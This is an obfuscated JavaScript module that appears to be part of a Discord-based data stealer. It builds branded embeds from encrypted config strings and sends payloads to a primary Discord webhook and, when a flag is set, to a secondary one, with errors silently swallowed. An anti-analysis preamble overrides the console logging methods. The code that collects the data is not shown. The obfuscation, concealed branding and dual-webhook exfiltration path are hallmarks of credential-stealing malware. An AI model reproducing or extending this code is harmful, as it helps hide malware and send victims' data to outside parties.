const _0x45331f = (function () {
    let _0x23043d = true
    return function (_0xa8067e, _0x497867) {
      const _0x152e97 = _0x23043d
        ? function () {
            if (_0x497867) {
              const _0x1bfc42 = _0x497867.apply(_0xa8067e, arguments)
              return (_0x497867 = null), _0x1bfc42
            }
          }
        : function () {}
      return (_0x23043d = false), _0x152e97
    }
  })(),
  _0x5e506f = _0x45331f(this, function () {
    let _0x3b2fb2
    try {
      const _0x2c3cd6 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x3b2fb2 = _0x2c3cd6()
    } catch (_0x2f27c5) {
      _0x3b2fb2 = window
    }
    const _0x43827f = (_0x3b2fb2.console = _0x3b2fb2.console || {}),
      _0x500442 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x3de96e = 0; _0x3de96e < _0x500442.length; _0x3de96e++) {
      const _0x395a99 = _0x45331f.constructor.prototype.bind(_0x45331f),
        _0x35f8a2 = _0x500442[_0x3de96e],
        _0x3d7a2d = _0x43827f[_0x35f8a2] || _0x395a99
      _0x395a99['__proto__'] = _0x45331f.bind(_0x45331f)
      _0x395a99.toString = _0x3d7a2d.toString.bind(_0x3d7a2d)
      _0x43827f[_0x35f8a2] = _0x395a99
    }
  })
_0x5e506f()
module.exports = (_0x7be25a) => {
  return {
    createEmbed(_0x3039d0) {
      let _0x3726b4 = {
        timestamp: new Date(),
        footer: {
          text: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.footer.text
          ),
          icon_url: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.footer.icon_url
          ),
        },
        author: {
          name: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.footer.text
          ),
          url: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.href
          ),
          icon_url: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.avatar_url
          ),
        },
      }
      for (let [_0x2f4e86, _0x220f78] of Object.entries(_0x3039d0)) {
        _0x3726b4[_0x2f4e86] = _0x220f78
      }
      _0x3726b4.title &&
        (_0x3726b4.url = _0x7be25a.utils.encryption.decryptData(
          _0x7be25a.config.embed.href
        ))
      return _0x3726b4
    },
    async sendToWebhook(_0x1c8dd3, _0x268d0a, _0x5b4e5d, _0x235d44 = true) {
      try {
        var _0x103871
        if (_0x1c8dd3 != '') {
          const _0x44cc0b = { url: _0x1c8dd3 }
          _0x103871 = new _0x7be25a.requires.discordjs.WebhookClient(_0x44cc0b)
        }
        const _0x589d54 = { url: _0x268d0a }
        const _0x59c09b = new _0x7be25a.requires.discordjs.WebhookClient(
          _0x589d54
        )
        let _0x4cd411 = {
          avatar_url: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.avatar_url
          ),
          username: _0x7be25a.utils.encryption.decryptData(
            _0x7be25a.config.embed.username
          ),
        }
        for (let [_0x4c9753, _0x3d4a53] of Object.entries(_0x5b4e5d)) {
          _0x4cd411[_0x4c9753] = _0x3d4a53
        }
        await _0x59c09b.send(_0x4cd411)
        if (_0x235d44 && _0x103871) {
          await _0x103871.send(_0x4cd411)
        }
      } catch {}
    },
  }
}
